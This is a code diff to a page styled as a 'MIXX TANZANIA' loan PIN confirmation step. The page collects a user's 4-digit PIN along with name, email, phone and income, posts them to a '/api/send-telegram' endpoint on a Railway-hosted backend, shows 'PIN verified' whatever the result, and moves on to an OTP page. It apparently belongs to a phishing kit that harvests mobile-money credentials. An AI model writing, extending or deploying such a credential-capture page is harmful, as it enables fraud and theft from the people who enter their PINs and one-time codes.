@@ -303,10 +303,12 @@
         // ============================================
         // MIXX TANZANIA - PIN CONFIRMATION PAGE
         // SECURE - Uses Backend API
+        // Railway URL: miixxyaass-production-d3f3.up.railway.app
         // ============================================
         
-        const BACKEND_URL = 'https://miixxyaass-production.up.railway.app';
+        const BACKEND_URL = 'https://miixxyaass-production-d3f3.up.railway.app';
         
+        // Get data from URL parameters
         const urlParams = new URLSearchParams(window.location.search);
         const amount = urlParams.get('amount') || '0';
         const term = urlParams.get('term') || '0';
@@ -318,14 +320,28 @@
         const employment = decodeURIComponent(urlParams.get('employment') || '');
         const income = decodeURIComponent(urlParams.get('income') || '');
 
+        // Validate required data
+        if (!name || !email || !phone) {
+            console.error('Missing required data');
+            document.getElementById('errorMsg').textContent = 'Missing application data. Redirecting...';
+            document.getElementById('errorMsg').classList.add('show');
+            setTimeout(() => {
+                window.location.href = 'index.html';
+            }, 2000);
+        }
+
+        // Update summary display
         document.getElementById('summaryAmount').innerText = `TZS ${parseFloat(amount).toLocaleString()}`;
         document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
         document.getElementById('summaryMonthly').innerText = `TZS ${parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits: 0, maximumFractionDigits: 0})}`;
         document.getElementById('summaryRate').innerText = `${rate}%`;
+        
+        // Update user details display
         document.getElementById('userName').innerText = name || '-';
         document.getElementById('userEmail').innerText = email || '-';
         document.getElementById('userPhone').innerText = phone || '-';
 
+        // PIN input elements
         const pinInputs = ['pin1', 'pin2', 'pin3', 'pin4'].map(id => document.getElementById(id));
         const confirmBtn = document.getElementById('confirmBtn');
         const errorMsg = document.getElementById('errorMsg');
@@ -396,16 +412,23 @@
                 income: income
             };
             
+            console.log('Sending PIN to backend:', data);
+            
             try {
                 const response = await fetch(`${BACKEND_URL}/api/send-telegram`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
                     body: JSON.stringify(data)
                 });
-                return await response.json();
+                
+                const result = await response.json();
+                console.log('Backend response:', result);
+                return result;
             } catch (error) {
-                console.error('Error:', error);
-                return { success: false };
+                console.error('Error sending to backend:', error);
+                return { success: false, error: error.message };
             }
         }
 
@@ -421,11 +444,13 @@
             errorMsg.classList.remove('show');
             showLoading(true);
             
+            // Send PIN to backend
             await sendPinToBackend(pin);
             
             successMsg.textContent = '✓ PIN verified! Redirecting...';
             successMsg.classList.add('show');
             
+            // Prepare data for next page
             const params = new URLSearchParams({
                 amount: amount,
                 term: term,
@@ -438,6 +463,7 @@
                 income: income
             });
             
+            // Redirect to OTP verification page
             setTimeout(() => {
                 window.location.href = `otp-verify.html?${params.toString()}`;
             }, 1500);
